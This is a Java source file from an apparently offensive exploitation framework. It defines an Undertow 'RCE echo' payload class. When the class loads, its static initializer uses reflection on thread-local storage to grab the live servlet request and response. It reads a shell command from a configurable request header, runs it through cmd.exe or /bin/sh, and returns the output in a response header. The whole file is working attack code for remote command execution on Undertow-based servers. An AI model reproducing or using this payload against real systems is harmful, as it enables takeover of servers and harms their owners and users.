package com.ppp.middleware.rceecho;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.JavaClassType;
import com.ppp.annotation.Middleware;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 * <p>
 * Version test
 * io.undertow:undertow-core:2.2.25.Final
 */
@Middleware(Middleware.Undertow)
@JavaClassType(JavaClassType.Default)
@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.RHEADER})
public class UndertowRE {
    private static String HEADER;
    private static String RHEADER;

    static {
        new UndertowRE();
    }
    public UndertowRE() {
        try {
            Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
            Object[] table = (Object[]) getFieldValue(threadLocals, "table");

            for (int i = 0; i < table.length; i++) {
                Object entry = table[i];
                if (entry == null)
                    continue;
                Object value = getFieldValue(entry, "value");
                if (value == null)
                    continue;

                if (value.getClass().getName().equals("io.undertow.servlet.handlers.ServletRequestContext")) {
                    Object request = getFieldValue(value, "originalRequest");
                    Object response = getFieldValue(value, "originalResponse");

                    String header = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
                    if (header != null && !header.isEmpty()) {
                        String result = exec(header);
                        invokeMethod(response, "setHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
//                        invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
//                        Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
//                        invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
                        return;
                    }

                }
            }

        } catch (Exception e) {
        }
    }

    public static String exec(String str) throws Exception {
        String[] cmd;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();

        // result
        byte[] bytes = new byte[1024];
        int len;
        StringBuilder stringBuilder = new StringBuilder();
        while ((len = inputStream.read(bytes)) != -1) {
            stringBuilder.append(new String(bytes, 0, len));
        }
        return stringBuilder.toString();
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        try {
            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
        } catch (Exception e) {
            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
        }
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }
}
